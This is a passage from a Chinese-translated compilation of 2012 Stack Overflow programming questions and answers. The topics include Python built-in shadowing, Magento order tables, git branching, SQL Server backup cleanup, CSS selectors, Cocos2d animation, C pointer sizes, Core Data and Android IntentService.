"deceit" : "csalás", "whether" : "vajon", "crenel" : "lőrés", "grotto" : "barlang", "diligence" : "szorgalom", "glimmers" : "szemek", "turmoil" : "felfordulás", "comprehend" : "megért", "awry" : "fonák", "entourage" : "diplomáciai kíséret", "appease" : "kielégít", "seething" : "forrongó", "brusque" : "rideg", "sulky" : "duzzogó", "sullen" : "mogorva", "jest" : "tréfa", "brisk" : "élénk", "mutton" : "ürühús", "beckoned" : "intett", "suffice" : "Elég", "pease" : "borsó", "darted" : "ugrott", "trot" : "ügetés", "sprouted" : "csírázott", "quarrel" : "veszekedés", "staggeredtls" : "Staggeredtls", "minnow" : "fürge cselle", "weaned" : "elválasztott", "betwixt" : "közöttem", "niggardly" : "zsugori", "hippocras" : "fűszeres", "forager" : "ellenséges területen rekviráló", "stir" : "kavar", "inexorably" : "kérlelhetetlenül", "lintel" : "szemöldökfa", "groggy" : "tántorgó", "lull" : "szünet", "hovel" : "kunyhó", "quaff" : "nagy kortyokban iszik", "amiss" : "rosszul", "heir" : "örökös", "sepulcher" : "síremlék", "lid" : "fedél", "wry" : "félrecsavart", "somber" : "komor", "comely" : "bájos", "apparition" : "jelenés", "abashed" : "elképedt", "gall" : "epe", "teetering" : "hintázni", "haggle" : "alkudozik", "fastidious" : "finnyás", "investiture" : "felavatás", "swarthy" : "napbarnított", "sot" : "iszákos", "prowess" : "bátorság", "endeavorh" : "Endeavorh", "conciliation" : "békéltetés", "haddock" : "foltos tőkehal", "expansively" : "terjedelmesen", "geld" : "herél", "unison" : "összhang", "bray" : "szamárbőgés", "dandelions" : "pitypang", "flamboyant" : "rikító", "aplenty" : "bőségesen", "slanting" : "dőlt", "excruciating" : "kínzó", "whilst" : "míg", "stench" : "bűz", "blunder" : "baklövés", "causeway" : "móló", "forage" : "takarmány", "pox" : "himlő", "dwell" : "lakik", "infant" : "csecsemő", "enormous" : "óriási", "enormity" : "szörnyűség", "paramour" : "szerető", "amiable" : "kedves", "lithe" : "karcsú", "noose" : "hurok", "prunes" : "aszalt szilva", "ludicrous" : "nevetséges", "grudgingly" : "kelletlenül", "despair" : "kétségbeesés", "recklessness" : "vakmerőség", "neither" : "sem", "feeble" : "gyenge", "nonetheless" : "mindazonáltal", "amends" : "módosítja", "amend" : "módosítandó", "scarcely" : "alig", "insists" : "ragaszkodik", "espoused" : "osztott", "gaze" : "bámul", "adjourn" : "elnapol", "suspicious" : "gyanús", "dread" : "rettegés", "sought" : "keresett", "scarce" : "szűkös", "enmity" : "ellenségeskedés", "eyrie" : "Sasfészek", "fealty" : "hűség", "envious" : "irigy", "peevish" : "szeszélyes", "prow" : "hajóorr", "trout" : "pisztráng", "clutching" : "kapaszkodva", "craven" : "gyáva", "manacle" : "bilincs", "teat" : "csöcs", "lickspittle" : "tányérnyaló", "wench" : "szajha", "scowled" : "összeráncolta a homlokát", "snoring" : "horkolás", "reluctantly" : "vonakodva", "expulsion" : "kiutasítás", "gossip" : "pletyka", "dais" : "emelvény", "merlon" : "párkázat", "plume" : "toll", "shallow" : "sekély", "ought" : "kellene", "oar" : "evezőlapát", "gaped" : "tátongott", "aisle" : "folyosó", "anxious" : "aggódó", "pouty" : "mogorva", "heedless" : "figyelmetlen", "gloom" : "homály", "niter" : "salétrom", "seldom" : "ritkán", "revulsion" : "ellenérzés", "defy" : "dacol", "furtive" : "titkos", "gaoler" : "börtönőr", "bitter" : "keserű", "grief" : "bánat", "sour" : "savanyú", "flustered" : "ideges", "obey" : "engedelmeskedik", "discipline" : "fegyelem", "weep" : "sír", "flay" : "megnyúz", "fugitive" : "szökevény", "treacherous" : "áruló", "indistinguishable" : "megkülönböztethetetlen", "moat" : "várárok", "entrail" : "belekből", "timbre" : "csengés", "draught" : "Csapolt", "palanquin" : "gyaloghintó", "splendid" : "pompás"}

def start_lesson(input):
    for a in input:
        kerdes = get_questioned_word(a,input[a])

        kerdes_key = kerdes[0]
        kerdes_value = kerdes[1]

        #if this line is here, i got "TypeError: 'dict' object is not callable", and i can't understand why. Unfortunetly i need this for the rest of the app. 
        input("jlkfjdslkfj: ")

        # and so on....

def get_questioned_word(input1, input2):
    szo = []
    mod = random.randrange(0,2)
    if mod == 0:
        szo = [input1, input2]
    else:
        szo = [input2, input1]
    return szo

def get_lesson(input):
    index = 0
    lecke_szavak = {}

    for a in szavak:
        if (index >= input[0] and index <= input[1]):
            lecke_szavak[a] = szavak[a]

        index += 1
    return lecke_szavak

def which_lesson():
    lecke = int(input("Melyik lecke?: "))
    lesson = {}
    lesson1 = [1,38]
    lesson2 = [39,76]
    lesson3 = [77,114]
    lesson4 = [115,152]
    lesson5 = [153,190]

    if (lecke == 1):
        lesson = get_lesson(lesson1)

    elif (lecke == 2):
        lesson = get_lesson(lesson2)

    elif (lecke == 3):
        lesson = get_lesson(lesson3)

    elif (lecke == 4):
        lesson = get_lesson(lesson4)

    elif (lecke == 5):
        lesson = get_lesson(lesson5)

    start_lesson(lesson)

which_lesson() 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T12:19:47.770

问题出在您的函数定义中：

```
def start_lesson(input):
                 ^^^^^ 
```

在这里，您覆盖了 default `input`，因此当您尝试使用它时，您正在尝试调用`dict`您正在传递的...

更改名称以不隐藏内置

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:25:06.390

除了 Jon Clements 指出的阴影问题之外，您可能想要[`raw_input()`](http://docs.python.org/2/library/functions.html#raw_input)而不是[`input()`](http://docs.python.org/2/library/functions.html#input)... 并且您希望将结果分配给某些东西。

# magento - Magento 订单数据存储在哪里？

> ID：13343578
> 
> 赞同：15
> 
> 时间：2012-11-12T12:17:20.060
> 
> 标签：magento, magento-1.6

我正在运行 Magento 1.6.2 并且有一些销售订单出现间歇性错误。客户的收费正确，但 Magento 管理页面在查看销售时报告的值不正确。我理解它为什么做错了——我的网站上的全部产品都可以享受 10% 的折扣，正因为如此，出了点问题。

同样，客户支付了正确的（折扣）金额，但数据必须错误地存储在 magento 数据库中，因为在管理系统中查看它并不能正确汇总值。应用 10% 折扣的目录价格规则不计入显示的总数。

更糟糕的是，我们使用 Zynk 将数据从 Magento 导入到我们的 Sage 200 后台系统，并且导入该系统的数据也缺少 10% 的折扣，这使得订单付款和 Sage 发票的核对变得非常痛苦。

我唯一能想到的是，数据以某种方式错误地存储在 magento 数据库中（没有应用 10% 的折扣），所以当 Zynk 收集数据时，它是不正确的。

谁能帮我了解在 Magento 数据库中哪里可以找到订单数据，这样我就可以查看为特定 Magento 订单号存储的内容 - 我至少可以开始调试这个，也许吧？

如果有人知道在哪里可以找到 Magento 用于执行订单数据库事务的代码的详细信息，特别是在存储数据之前应该在哪里应用折扣，那也会有很大帮助。

干杯!

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-11-12T16:04:54.047

订单数据保存在数据库表中`sales_flat_order`，`sales_flat_order_item`

折扣适用于`Mage_SalesRule_Model_Validator`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-12T16:08:38.580

您可以分别在您的`(tables prefix)_sales_flat_order`和中找到订单和订单商品数据`(tables prefix)_sales_flat_order_item`。但请记住，下订单时，Magento 只需从其各自的报价中复制数据。所以在我看来，你应该首先检查`(table prefix)_sales_flat_quote`和`(table prefix)_sales_flat_quote_item`。

# git - 在git中的分支内创建分支

> ID：13343581
> 
> 赞同：10
> 
> 时间：2012-11-12T12:17:30.867
> 
> 标签：git, branch, git-branch

在我的存储库中，我有一个 master 分支，然后是一个从 master 分支出来的暂存分支。现在我需要添加应该从暂存分支出来的第三个分支。这意味着我需要一个从另一个分支出来的分支。有人可以帮忙吗？

我用于创建分支的语法是这样的：

```
git branch <name_of_your_new_branch>

git push origin <name_of_your_new_branch>

git checkout <name_of_your_new_branch> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-12T12:38:07.943

这可以在本地创建您的分支：

```
git checkout staging
git checkout -b newBranch 
```

或者，一行：

```
git checkout -b newBranch staging 
```

这将从 的当前 HEAD 开始`staging`，但请注意，一个分支并不真正来自另一个分支：它来自一个提交（并且该提交可以是多个分支的一部分）。

然后，您可以推送您的新分支，在一个命令中[跟踪远程分支：](https://stackoverflow.com/a/2286030/6309)

```
git push -u origin newBranch 
```

# qt-creator - 通过 WLAN 从 Qt Creator 连接到 CODA 调试代理

> ID：13343586
> 
> 赞同：1
> 
> 时间：2012-11-12T12:17:47.360
> 
> 标签：qt-creator, symbian, remote-debugging

我在诺基亚 5800 上安装了 CODA，并将其设置为使用 WLAN 而不是 USB。

它现在正在运行，说：

```
Welcome to CODA for Symbian OS

Status: Connected

WLAN Address: 192.168.2.113
WLAN Port number: 65029 
```

但是从 Qt Creator 方面我该怎么做呢？Qt Creator 还在说`No device is connected. Connect a device and try again.`. 我假设我必须在 Qt Creator 设置中的某处输入 IP/端口，所以它知道连接到哪里。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T13:02:52.040

了解如何执行此操作，从`Projects->Targets->Run`设置`Communication Channel`为`WLAN`，然后键入 IP 地址和端口。

![在此处输入图像描述](../Images/d66cb09953e2ffb208921c272eff6091.png)

# imagemagick - TYPO3 受限用户图像调整

> ID：13343588
> 
> 赞同：0
> 
> 时间：2012-11-12T12:17:56.560
> 
> 标签：imagemagick, typo3, typoscript, tsconfig

在 TYPO3 BE 中，我错过了页面元素图像和带有图像的文本中的图像调整对话框。当我编辑这样一个元素时，我错过了这个对话框，它是为放置在选项卡外观中的管理员用户而设计的。我认为这是因为该对话框基于默认情况下对受限用户禁用的 imagemagick？！

对于受限用户，它会丢失。

知道如何配置受限用户 TSConfig 以启用图像调整吗？;-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T19:29:13.000

您只需授予用户对该`image_effects (tt_content)`字段的访问权限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T11:00:11.240

抱歉，评论表太短了。

这个pgame是什么意思？根据这个描述。 [http://www.typo3forum.net/forum/typo3-4-x-backend/13748-bereiche-backends-fuer-bestimmte-user-ausbleden.html](http://www.typo3forum.net/forum/typo3-4-x-backend/13748-bereiche-backends-fuer-bestimmte-user-ausbleden.html) 我在用户 TSConfig 中设置 `TCEFORM.tt_content.image_effects.disabled = 0`

但就像该页面上的最后一篇文章中所述，它仅适用于页面 TSConfig，不适用于用户 TSConfig。我尝试了其他一些 TSConfig 之类的

`admPanel.override.image.settings = 1` 和

`admPanel.override.imageblock = 1`

或多或少受到[http://typo3.org/documentation/document-library/core-documentation/doc_core_tsconfig/4.1.0/view/1/2/](http://typo3.org/documentation/document-library/core-documentation/doc_core_tsconfig/4.1.0/view/1/2/)和描述的影响。在 admpanel 覆盖部分下，descr 在哪里。“你可以看看管理面板的 HTML 代码”但没有积极的结果？！任何人的想法。对话框图像设置及其调整大小功能。使用 tt_content 中的 imagewidth 和 imageheight 字段。我在谷歌上找不到任何有用的东西，这个typo3用户管理让我很紧张）-;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T14:16:15.153

在 Admin Tools->usergroup->Access Lists-> **Allowed excludefields 下**，您必须激活 Page Content **Width (pixels)(imagewidth)**和**Height (pixels)(imageheight)**。

# macos - 在 NSView 中拖放

> ID：13343589
> 
> 赞同：5
> 
> 时间：2012-11-12T12:17:57.743
> 
> 标签：macos, drag-and-drop, nsdragginginfo

我正在测试 NSView 中的拖放，但从`draggingEntered:`未被调用。

代码：

```
#import <Cocoa/Cocoa.h>
@interface testViewDrag : NSView <NSDraggingDestination>
@end

@implementation testViewDrag
- (id)initWithFrame:(NSRect)frame
{
   self = [super initWithFrame:frame];
   if (self)
{
    [self registerForDraggedTypes:[NSImage imagePasteboardTypes]];
    NSLog(@"initWithFrame");
}
return self;
}

-(NSDragOperation)draggingEntered:(id<NSDraggingInfo>)sender
{
NSLog(@"draggingEntered");
return NSDragOperationEvery;
}

-(NSDragOperation) draggingUpdated:(id<NSDraggingInfo>)sender
{
  NSLog(@"draggingUpdated");
  return NSDragOperationEvery;
}
@end 
```

在界面生成器中，我将`subView`（类设置为`testViewDrag`）添加到主窗口。在日志中我可以看到`initWithFrame`日志，但是当我拖动时，日志中没有显示任何内容。

我错过了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T12:40:10.350

“要接收拖动操作，您必须通过向对象发送 registerForDraggedTypes: 消息来注册窗口或视图将接受的粘贴板类型，该消息在 NSWindow 和 NSView 中定义，并实现 NSDraggingDestination 协议中的几种方法。在拖动会话期间，一个只有当目的地注册了与被拖动的粘贴板数据类型匹配的粘贴板类型时，候选目的地才会收到 NSDraggingDestination 消息。目的地在图像进入时接收这些消息，在内部移动，然后退出或在目的地边界内释放。” [您可以在此处](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/DragandDrop/Concepts/dragdestination.html)阅读有关拖放编程主题的更多信息。在我看来，您的问题在于您在`registerForDraggedTypes:`方法中定义的参数。

尝试用这个替换它：

```
[self registerForDraggedTypes:[NSArray arrayWithObjects:
        NSColorPboardType, NSFilenamesPboardType, nil]]; 
```

希望这可以帮助！

# ajax - 根据 http 接受标头提供内容 - 缓存问题？

> ID：13343599
> 
> 赞同：3
> 
> 时间：2012-11-12T12:18:42.017
> 
> 标签：ajax, http, google-chrome

我正在开发一个应用程序，该应用程序应该为“正常”浏览器请求和 AJAX 请求提供不同内容的相同 URL 请求。（实际上，如果请求是 AJAX，则将响应 HTML 封装在 JSON 对象中）。

为此，我在服务器端检测 AJAX 请求，并适当处理响应，请参见下面的伪代码：

```
function process_response(request, response)
{
 if request.is_ajax 
 {
   response.headers['Content-Type'] = 'application/json';
   response.headers['Cache-Control'] = 'no-cache';
   response.content = JSON( some_data... )
 }
} 
```

问题是，当对当前查看的 URL 的第一个 AJAX 请求**在 Google Chrome 上发生奇怪的事情时**- 如果在响应到来并通过 JavaScript 处理之后，用户点击了一些链接（静态，重定向到其他页面）和然后单击浏览器中的后退按钮，他看到**返回的 JSON**代码而不是呈现的网站（记录服务器我可以说**没有发出请求**）。在我看来，Chrome 存储了特定 URL 的最新请求响应，并且没有考虑到它具有不同的内容类型等。

这是 Chrome 中的错误还是**我滥用了 HTTP 协议**？

--- 更新 2012 年 12 月 11 日 12:38 UTC

在 PatrikAkerstrand 回答之后，我发现了以下 Chrome 错误：[http ://code.google.com/p/chromium/issues/detail?id=94369](http://code.google.com/p/chromium/issues/detail?id=94369)

任何想法如何**避免这种行为**？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:24:08.047

您还应该包括[`Vary-header`](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.44)：

```
response.headers['Vary'] = 'Content-Type' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-11T22:00:18.090

`Vary`是在内容协商中控制缓存上下文的标准方法。不幸的是，它在某些浏览器中也有错误的实现，请参阅[浏览器缓存变坏](http://jakearchibald.com/2014/browser-cache-vary-broken/)。

我建议使用唯一的 URL。根据您的框架功能，您可以将浏览器重定向 (302) 到 URL +`.html`以强制响应格式并使缓存键在浏览器会话中唯一。然后对于 AJAX 请求，您仍然可以保留无后缀 URL。或者，您可以在 AJAX URL 后面加上`.json`.

另一个选项是：为 AJAX 请求添加前缀`/api`或添加一些缓存增强查询参数`?rand=1234`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-08-06T15:22:52.390

设置`cache-control`在`no-store`我的情况下，虽然`no-cache`没有。不过，这可能会产生不必要的副作用。

> `no-store`：响应可能不会存储在任何缓存中。尽管可以设置其他指令，但仅此一项是您在现代浏览器上防止缓存响应所需的唯一指令。
> 
> 来源：  [Mozilla 开发者网络 - HTTP Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)

# mysql - 用新备份替换以前的数据库备份

> ID：13343604
> 
> 赞同：1
> 
> 时间：2012-11-12T12:19:32.157
> 
> 标签：mysql, sql, sql-server-2008-r2

我使用这个脚本从我的 sql server 数据库中获取备份

```
DECLARE @name VARCHAR(50) -- database name 
DECLARE @path VARCHAR(256) -- path for backup files 
DECLARE @fileName VARCHAR(256) -- filename for backup 
DECLARE @fileDate VARCHAR(20) -- used for file name

--Path to backups
SET @path = 'E:\DataBase Backups\' 

SELECT @fileDate = CONVERT(VARCHAR(20),GETDATE(),112)

DECLARE db_cursor CURSOR FOR 
SELECT name 
FROM master.dbo.sysdatabases 
WHERE name NOT IN ('master','model','msdb','tempdb','ReportServer','ReportServerTempDB') 

OPEN db_cursor  
FETCH NEXT FROM db_cursor INTO @name  

WHILE @@FETCH_STATUS = 0  
BEGIN  
       --Remove if you dont want a date stamp 
       SET @fileName = @path + @name + '_' + @fileDate + '.BAK' 

      -- SET @fileName = @path + @name + '.BAK' 
       BACKUP DATABASE @name TO DISK = @fileName with noinit

       FETCH NEXT FROM db_cursor INTO @name  
END  

CLOSE db_cursor  
DEALLOCATE db_cursor 
```

此代码每天制作新的备份文件，但我需要用今天的备份替换我的旧备份，或者在制作今天的备份后，所有旧备份都被删除了！请你帮助我好吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T23:15:40.830

您可以使用未记录的扩展存储过程 xp_delete_file 来删除备份文件。Microsoft 在内部添加了一些保护措施，以允许其仅删除数据库和事务日志备份文件。所以它不能用于删除任何其他文件类型；甚至没有文本文件。

您需要声明一些额外的变量。

```
DECLARE @DeleteDate datetime = DATEADD(wk, -1, GETDATE())
DECLARE @FileExtension nvarchar(3) = N'BAK'
DECLARE @DeletePath nvarchar(512) 
```

然后将此代码添加到光标循环中。

```
SET @DeletePath = @path + @name
EXEC master.sys.xp_delete_file 0,@DeletePath,@FileExtension,@DeleteDate,1; 
```

@DeleteDate 用于告诉存储过程要删除哪些文件早于某个日期。只需使用 DATEADD 函数来设置截止日期。

@DeletePath 将是您的@path + @name，因此它将输出类似“E:\DataBase Backups\MyDatabaseName”的内容。

@FileExtention 用于告诉要删除哪些文件类型；例如 BAK' 或 'TRN'。

我一直在使用相同的代码来清除自​​定义 TSQL 备份作业中的旧备份文件，并且效果很好。

# sql - SELECT DISTINCT INTO 语法错误 interbase sql

> ID：13343610
> 
> 赞同：2
> 
> 时间：2012-11-12T12:19:54.153
> 
> 标签：sql, firebird, interbase

我正在尝试使用以下语法制作只有不同值的表的副本：

```
SELECT DISTINCT *
INTO :TAB_DISTINCT
FROM TAB_MAIN 
```

但是 IB 不喜欢 INTO 行（构建一个计划好，该行注释）无效的令牌。动态 SQL 错误。SQL 错误代码 = -104。令牌未知 - 第 2 行，字符 -1。进入。

我尝试使用 & 不带冒号，也尝试使用 & 不带空的预先存在的 TAB_DISTINCT 并设置字段。但没有雪茄。

有人知道我在这里犯了什么愚蠢的语法错误吗？非常感谢，布赖恩

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T14:02:38.320

您可以使用以下语句制作表的副本：

```
 INSERT INTO copy_table (field1, field2, ... fieldn)
  SELECT DISTINCT field1, field2, ... fieldn
  FROM source_table 
```

# css - id-selector 中带有冒号的所有情况的 CSS

> ID：13343617
> 
> 赞同：4
> 
> 时间：2012-11-12T12:20:21.877
> 
> 标签：css, css-selectors

这是与此处提到的案例相关的问题：[在 CSS 选择器中处理元素 ID 中的冒号](https://stackoverflow.com/questions/122238/handling-a-colon-in-an-element-id-in-a-css-selector)

我有一些代码，其中包含以这种方式记录的脚注`<sup id="fnref:fn1">1</sup>`等`<sup id="fnref:fn2">2</sup>`。

在我的 CSS 中，我知道如何为每种情况制定规则

```
sub#fnref\:fn1 {vertical-align: super} // or "\3A" instead of ":" to be correct
sub#fnref\:fn2 {vertical-align: super} 
```

但是如何编写 css 以将所有案例纳入一个规则（我不想为所有潜在的脚注制作一个无穷无尽的列表。

在此先感谢弗洛里安

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:23:32.010

请改用属性选择器：

```
sup[id^="fnref:fn"] {vertical-align: super} 
```

顺便说一句，您应该选择`sup`元素而不是`sub`元素。

# iphone - 在 Cocos2D 中如何移动精灵动画一步

> ID：13343618
> 
> 赞同：1
> 
> 时间：2012-11-12T12:20:23.173
> 
> 标签：iphone, cocos2d-iphone

我的环境是带有 Cocos2d 的 iPhone。

我正在尝试使用精灵动画将游戏中的玩家向前移动一步，尽管我不确定执行此操作的正确方法。

首先作为参考，这里是我的 init 方法的一部分，它将动画加载到 NSDictionary 中供以后的用户使用。

```
-(id) init
{
if( (self=[super init]) ) {
    ..
    ..
    NSMutableArray *walkUpFrames = [NSMutableArray array];
    [walkUpFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player01.png"]];
    [walkUpFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player02.png"]];
    [walkUpFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player03.png"]];
    NSMutableArray *walkDownFrames = [NSMutableArray array];
    [walkDownFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player04.png"]];
    [walkDownFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player05.png"]];
    [walkDownFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player06.png"]];
    NSMutableArray *walkLeftFrames = [NSMutableArray array];
    [walkLeftFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player07.png"]];
    [walkLeftFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player08.png"]];
    [walkLeftFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player09.png"]];
    NSMutableArray *walkRightFrames = [NSMutableArray array];
    [walkRightFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player10.png"]];
    [walkRightFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player11.png"]];
    [walkRightFrames addObject: [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:@"player12.png"]];

    self.walkingFrames = [NSDictionary dictionaryWithObjectsAndKeys:
                          walkUpFrames, @"up",
                          walkDownFrames, @"down",
                          walkLeftFrames, @"left",
                          walkRightFrames, @"right",
                          nil];
    ......
}
return self;
} 
```

首先，我尝试使用此代码移动成功将精灵移动到新位置并运行动画的播放器，但精灵立即到达该位置，然后运行动画，这是不好的。

```
-(void)setPlayerPosition:(CGPoint)position {

  CCAnimation *walkAnim = [CCAnimation animationWithFrames:[self.walkingFrames valueForKey:@"right"] delay:0.05 ];
  self.walkAction = [CCAnimate actionWithAnimation: walkAnim restoreOriginalFrame:YES];

  [_player runAction:_walkAction];
  _player.position = position;
} 
```

我猜我应该使用 CCMoveTo，但我不知道如何将它与 animationWithFrames 一起使用。有任何想法吗？（请提供代码示例）

```
-(void)setPlayerPosition:(CGPoint)position {

 self.walkAction = [CCMoveTo actionWithDuration:0.1 position:position];

 [_player runAction:_walkAction];

} 
```

感谢您的任何回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T06:53:36.237

跑步`multiple actions`成功了。谢谢莫里恩....

```
-(void)setPlayerPosition:(CGPoint)position
{
    CCAnimation *walkAnim = [CCAnimation animationWithFrames:[self.walkingFrames valueForKey:@"right"] delay:0.1 ];
    [_player runAction:[CCAnimate actionWithAnimation: walkAnim restoreOriginalFrame:YES]];

    [_player runAction:[CCMoveTo actionWithDuration:0.3 position:position]];
} 
```

# c - 指针大小不正确

> ID：13343619
> 
> 赞同：2
> 
> 时间：2012-11-12T12:20:24.170
> 
> 标签：c

> **可能重复：**
> [C++ 中 64 位计算机的指针大小是多少？](https://stackoverflow.com/questions/6841405/what-the-pointer-size-in-64-bits-computer-in-c)

我在大学学习C。

我尝试在 Windows 7/8 上设置编程环境并遇到问题

这段代码：

```
int main()
  int *p;
  printf("%d",sizeof(p));
  return 0;
} 
```

打印 4 而不是 8（大学打印 8）。我能做些什么？

我的 Windows 是 64 位和 x64 处理器。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:22:33.203

您可能会将代码编译成 32 位应用程序。您需要将其编译为 64 位应用程序。检查您的编译器设置。您的操作系统是 64 位并不重要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:29:45.377

这里的“问题”是取决于编译架构的结果。

C 中的基本类型（例如`int`, `double`, `char`）没有预定义的大小；由编译器决定为哪种类型使用哪种大小。

至于指针，您通常希望能够寻址您机器上可用的任何内存位置。在 32 位架构上，地址范围是 2^32。由于指针只不过是一个引用内存所在地址的数字，因此 2^32 个地址（即 4 个字节的范围）就可以了。

对于 64 位系统，为了寻址所有内存，需要 2^64（即 8 个字节）的范围。

因此，指针大小需要取决于系统架构。

请记住：所有指针类型（无论是它`int*, char*, double*`还是其他）都具有相同的大小！因此，在 32 位上使用整数和整数指针可能会有点混乱，因为`int`在大多数体系结构上也有 4 个字节的大小。

# objective-c - 应用程序崩溃，因为它无法使用 nil 模型创建 NSPersistentStoreCoordinator

> ID：13343624
> 
> 赞同：0
> 
> 时间：2012-11-12T12:20:41.300
> 
> 标签：objective-c, cocoa-touch, core-data, ios6, xcode4.5

我创建了一个运行良好的单视图应用程序，但是当我在其中添加核心数据时，只需复制 Xcode 在 Empty Project 中使用 Core Data 生成的相同代码。

但是我的应用程序崩溃了，说它无法创建持久存储协调器。在所有异常上应用断点我开始知道我的应用程序在这条线上崩溃了

```
 _persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:self.managedObjectModel]; 
```

在此之前，我已经验证了托管对象模型中的 URL。 **URL 返回 NULL。**

```
- (NSManagedObjectModel *)managedObjectModel
{
    if (_managedObjectModel != nil) {
        return _managedObjectModel;
    }
    NSURL *modelURL = [[NSBundle mainBundle] URLForResource:@"ProjectName" withExtension:@"momd"];

    NSLog(@"Url:%@",modelURL);
    _managedObjectModel = [[NSManagedObjectModel alloc] initWithContentsOfURL:modelURL];
    return _managedObjectModel;
} 
```

我已经完成了在单视图应用程序中添加核心数据的所有必要操作，但使用此链接[在单视图应用程序中添加核心数据](http://remapps.net/2012/02/07/adding-core-data-to-a-project/)

**个人看法**:: 我认为 URL 出了点问题，因为它返回 NULL。

请帮帮我，我遇到了很大的麻烦。

感谢期待

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T22:01:03.343

我相信是您的 URLForResource:@"ProjectName" 导致了问题。尝试用以下代码替换该代码块：

```
- (NSManagedObjectModel *)managedObjectModel
{
if (_managedObjectModel != nil) {
    return _managedObjectModel;
}
NSURL *modelURL = [[NSBundle mainBundle] URLForResource:@"Model" withExtension:@"momd"];

NSLog(@"Url:%@",modelURL);
_managedObjectModel = [[NSManagedObjectModel alloc] initWithContentsOfURL:modelURL];
return _managedObjectModel;
} 
```

除非您在创建 Core Data 模型时重命名了 .xcdatamodeld 文件，否则这将起作用。要检查 URLForResource: 应该指向什么，请检查包中 .xcdatamodeld 的名称。为了使您当前的代码工作，它必须被称为 ProjectName.xcdatamodeld。

# node.js - 如何在 Windows Azure 上最有效地启动 Node.js 应用程序？

> ID：13343625
> 
> 赞同：0
> 
> 时间：2012-11-12T12:20:46.353
> 
> 标签：node.js, azure

在 Windows Azure 上部署 Node.js 应用程序存在三种方式，web-role、web-site 和 git-azure（[链接](http://tomasz.janczuk.org/2012/06/three-ways-of-deploying-nodejs-apps-to.html)）。我不知道 whitch 对我的需求最有效。我的应用程序是带有 RESTful API 的可读性算法，可以解析新闻网站，计算简单，但负载很高。当然，我需要透明的水平缩放。我希望能得到你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T01:13:22.163

我的 0.02 美元。

如果您的产品仅基于 Node.js，没有后台工作者、业务逻辑层和 API 层等很多层和组件，Windows Azure 网站应该是最佳选择。通过 Git、GitHub、TFS、FTP 等部署 Node.js 应用程序非常简单。它还提供扩展（在保留模式下）和扩展选项。但请记住，Windows Azure 网站下的所有应用程序都将以 32 位 WOW 模式运行。

Windows Azure Web Role 与 Windows Azure Web Site 类似，但需要自己配置 Node.js 环境。（如果您使用的是 azure powershell 工具，它可以通过使用一些启动命令帮助您建立节点。）如果您需要在工作角色或缓存（不是共享缓存）中工作的东西，Web Role 可能会更好。

我从未听说过 git-azure，但它看起来像是一种工具，您可以在工作角色上托管多个节点应用程序。

# android - 订阅或绑定现有的 Intent 服务

> ID：13343627
> 
> 赞同：5
> 
> 时间：2012-11-12T12:20:51.153
> 
> 标签：android, android-intent, android-service, intentservice

我有一个具有初始活动的应用程序，该应用程序在列表视图中列出了一些文件。单击列表中的某个项目时，它会将您带到该特定文件的详细活动。

在详细视图中，我有一个名为下载的按钮，当您单击下载时，它会启动一个 IntentService，它会设置要下载的文件，如下所示：

```
downloadButton.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {
        Intent intent = new Intent(AppDetailsActivity.this, AppDownloadService.class);
        intent.putExtra(Consts.APP_DOWNLOAD_RECEIVER_KEY, new DownloadReceiver(new Handler()));
        startService(intent);
    }
}); 
```

DownloadReceiver 类用于更新下载文件详细活动中的进度条。

现在我想做的...

如果用户当前正在从详细活动下载文件，然后返回到上一个活动，我希望活动以某种方式订阅/绑定到相同的 IntentService 并检索结果，以便它可以在列表中显示进度条正在下载的文件的项目。

1.  这可以使用 IntentService 吗？
2.  IntentService 是正确的吗？
3.  有没有例子（因为我没有找到任何可以告诉我如何做到这一点的东西）？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-30T14:51:06.550

对于下载，您肯定可以使用`IntentService`. 它在不同的线程上运行。另外，请记住，`startService()`多次调用`IntentService`它会创建一个队列并一次处理一个意图。

